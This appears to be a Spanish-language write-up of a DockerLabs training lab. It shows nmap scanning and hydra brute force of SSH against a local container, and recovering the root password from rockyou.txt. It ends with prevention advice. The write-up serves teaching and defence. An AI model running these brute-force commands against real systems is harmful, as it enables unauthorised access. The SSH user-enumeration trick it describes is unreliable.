# 🔓 BreakMySSH - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20F%C3%A1cil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/T%C3%A9cnicas-Hydra%20%7C%20Fuerza%20Bruta%20SSH-red)

## 📌 Resumen

Máquina de nivel **Muy Fácil** de [DockerLabs](https://dockerlabs.es/) que
explota un **servicio SSH con credenciales débiles**. A través de **fuerza
bruta** con Hydra y `rockyou.txt`, se obtiene acceso directo como **root**.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `nmap -p-` | Solo 22/tcp (SSH) |
| Fingerprinting | `nmap -sCV` | OpenSSH 7.7 (Debian) |
| Fuerza bruta | `hydra` + `rockyou.txt` | `root:estrella` |
| Acceso SSH | `ssh root@172.17.0.2` | **root** ✅ |

> **Nota:** Esta máquina no incluye archivo de flag. El objetivo es demostrar
> acceso como `root`, evidenciado con `whoami`.

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```

**Resultado:**

| Puerto | Servicio |
|--------|----------|
| 22     | SSH      |

Solo el puerto 22 está abierto. No hay web, no hay FTP, no hay nada más.

### Fingerprinting

```bash
nmap -sCV -p22 172.17.0.2 -oN targeted
```

**Resultado:**

```
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
```

✅ Servicio SSH identificado. La versión 7.7 no tiene vulnerabilidades
conocidas explotables directamente, así que el vector es **fuerza bruta**.

---

## 💥 Explotación

### 1. Crear listas de usuarios y contraseñas

Como solo hay SSH, el objetivo es encontrar credenciales válidas. Primero se
prueba con listas cortas:

```bash
cat > users.txt << 'EOF'
root
admin
user
ubuntu
tails
test
guest
EOF

cat > pass.txt << 'EOF'
root
toor
password
123456
admin
letmein
estrella
docker
msfadmin
EOF
```

### 2. Fuerza bruta inicial (listas cortas)

```bash
hydra -L users.txt -P pass.txt -t 4 ssh://172.17.0.2
```

**Resultado:** sin éxito.

### 3. Verificar qué usuarios existen

Un truco útil: SSH responde diferente si el usuario existe o no. Se prueba
conectar manualmente:

```bash
ssh root@172.17.0.2
ssh user@172.17.0.2
```

Si SSH **pide contraseña**, el usuario **existe**. Si dice "Permission denied"
sin pedir contraseña, el usuario **no existe**.

✅ Confirmado: `root` existe (pide contraseña).

### 4. Fuerza bruta con `rockyou.txt`

Con el usuario `root` confirmado, se ataca con el diccionario completo:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
```

**Credenciales obtenidas:**

```
root:estrella
```

La contraseña `estrella` está en `rockyou.txt` (aparece cerca del inicio).

### 5. Acceso SSH

```bash
ssh root@172.17.0.2
# password: estrella
```

> ⚠️ Si aparece `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`:
> ```bash
> ssh-keygen -R 172.17.0.2
> ```

Comprobación:

```bash
whoami
# root
```

✅ **Máquina comprometida completamente.**

---

## 📸 Evidencia

<img width="231" height="54" alt="image" src="https://github.com/user-attachments/assets/d42873c1-4ac9-4aae-8c10-f5d003fd979d" />


---

## 🏁 Flags

Esta máquina **no incluye archivo de flag**. La evidencia es:

```bash
whoami
# root
```

> Se buscó `/root/flag.txt` y no existe. El usuario `lovely` existe en el
> sistema, pero al ser root directamente, no fue necesario pivotar.

---

## 🧠 Lecciones aprendidas

1. **SSH con credenciales débiles es un vector clásico.** Máquinas "Muy Fáciles"
   suelen resolverse por fuerza bruta.
2. **`rockyou.txt` es tu amigo.** Contraseñas como `estrella` aparecen al
   inicio del diccionario.
3. **SSH filtra si un usuario existe o no.** Si pide contraseña, el usuario
   existe. Si dice "Permission denied" sin pedir nada, no existe.
4. **Listas cortas primero, `rockyou.txt` después.** Ahorra tiempo si aciertas
   con candidatos obvios.
5. **`-t 4` siempre para SSH.** Más hilos cortan la conexión.
6. **Limpiar `known_hosts`** con `ssh-keygen -R` es rutina en DockerLabs.

---

## 🛡️ ¿Cómo se previene?

1. **Deshabilitar login de root por SSH** (`PermitRootLogin no` en `sshd_config`).
2. **Usar autenticación por clave SSH**, no contraseñas.
3. **Contraseñas fuertes** (mínimo 12 caracteres, mayúsculas, números, símbolos).
4. **Fail2ban** para bloquear intentos de fuerza bruta.
5. **Cambiar el puerto SSH** (medida de seguridad por oscuridad, pero ayuda).
6. **Limitar intentos de login** con `MaxAuthTries` bajo.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `hydra`
- `ssh`

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [OpenSSH - sshd_config](https://man.openbsd.org/sshd_config)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-07
